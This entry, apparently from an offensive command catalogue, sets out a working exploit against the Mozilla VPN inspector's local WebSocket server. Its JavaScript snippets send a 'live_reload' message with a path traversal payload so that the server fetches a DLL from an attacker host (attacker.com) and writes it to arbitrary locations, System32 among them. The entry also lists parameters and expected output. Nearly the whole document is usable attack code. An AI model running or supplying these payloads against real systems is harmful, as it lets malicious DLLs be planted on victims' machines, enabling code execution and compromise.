---
data: >-
  const ws = new WebSocket('ws://localhost:8765/'); ws.onopen = () => {
  ws.send('live_reload ${attacker_server}/..\\..\\traversal_poc.dll'); };
tags:
  - websocket
  - exploitation
type: command
output: null
executor: javascript
platforms:
  - Windows
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:29.896Z'
id: 6768351f-b3a2-44b3-9013-d906da5bbbe5
verified: false
validated: true
submitted: true
---
# send-websocket-live-reload

## Command

```javascript
const ws = new WebSocket('ws://localhost:8765/');
ws.onopen = () => {
  ws.send('live_reload ${attacker_server}/..\\..\\traversal_poc.dll');
};
```

## Description

This JavaScript command establishes a WebSocket connection to the Mozilla VPN inspector's local server and sends a 'live_reload' message with a path traversal payload to trigger arbitrary file download and write.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `ws://localhost:8765/` | WebSocket URL for inspector | Yes |
| `live_reload` | Command type to fetch and announce file | Yes |
| `${attacker_server}` | URL of attacker's HTTP server hosting the file | Yes |
| `/..\\..\\traversal_poc.dll` | Path with traversal to escape temp folder | Yes |

## Examples

### Basic Usage

```javascript
const ws = new WebSocket('ws://localhost:8765/');
ws.onopen = () => {
  ws.send('live_reload http://attacker.com/traversal_poc.dll');
};
```

### Advanced Usage

```javascript
const ws = new WebSocket('ws://localhost:8765/');
ws.onopen = () => {
  ws.send('live_reload http://attacker.com/payload/..\\..\\..\\Windows\\System32\\malicious.dll');
};
ws.onerror = (e) => console.log('Error:', e);
```

## Expected Output

WebSocket connection opens, command sent; server downloads file from attacker_server and writes it to arbitrary path (e.g., C:\Users\user\AppData\Local\Mozilla\traversal_poc.dll). May log success or error in client console; network traffic shows HTTP GET to payload URL.

## Related

- [[Related Procedure]]
